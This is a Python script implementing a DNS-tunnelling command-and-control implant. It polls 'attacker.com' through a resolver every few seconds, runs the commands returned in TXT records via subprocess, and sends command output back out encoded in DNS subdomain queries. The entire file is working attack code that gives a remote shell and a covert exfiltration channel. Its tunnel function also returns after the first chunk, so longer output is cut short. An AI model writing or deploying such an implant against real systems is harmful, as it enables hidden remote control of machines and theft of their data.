
import base64
import dnslib
import socket
import time
from enum import Enum
import subprocess

class TunnelMessageType(Enum): 
    PROBE = 1
    ACK = 2

def print_status(s: str): 
    print(f"[*] {s}")

class Tunneler: 
    def __init__(self, attacker_domain: str, resolver_ip_addr: str): 
        self.attacker_domain = attacker_domain
        self.resolver_ip_addr = resolver_ip_addr
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def tunnel(self, text: str) -> str | None: 
        chunked_string = self._chunk_string(text)

        for payload in chunked_string: 
            encoded = base64.urlsafe_b64encode(payload.encode()).decode().strip("=")

            domain = f"{encoded}.{self.attacker_domain}"

            print_status(f"Resolving query {domain}")

            q = dnslib.DNSRecord.question(domain, qtype="TXT")

            self.socket.sendto(q.pack(), (self.resolver_ip_addr, 53))

            response, _ = self.socket.recvfrom(4096)

            reply = dnslib.DNSRecord.parse(response)

            for rr in reply.rr: 
                if rr.rtype == dnslib.QTYPE.TXT: 
                    return base64.urlsafe_b64decode(str(rr.rdata)).decode()
            return None
        

    def _chunk_string(self, s: str): 
        return [s[i:i+30] for i in range(0, len(s), 30)]


def main(): 
    tunneler = Tunneler("attacker.com", "10.0.2.51")
    while True: 
        time.sleep(3)

        response = tunneler.tunnel(TunnelMessageType.PROBE.name)
        if not response: 
            continue
        print_status(response)

        if response == TunnelMessageType.ACK.name: 
            continue
        else: 
            result = subprocess.run(
                response.strip().split(" "),
                capture_output=True,
                text=True
            )
            if result.stdout: 
                tunneler.tunnel(result.stdout)
            if result.stderr: 
                tunneler.tunnel(result.stderr)


if __name__ == "__main__": 
    main()

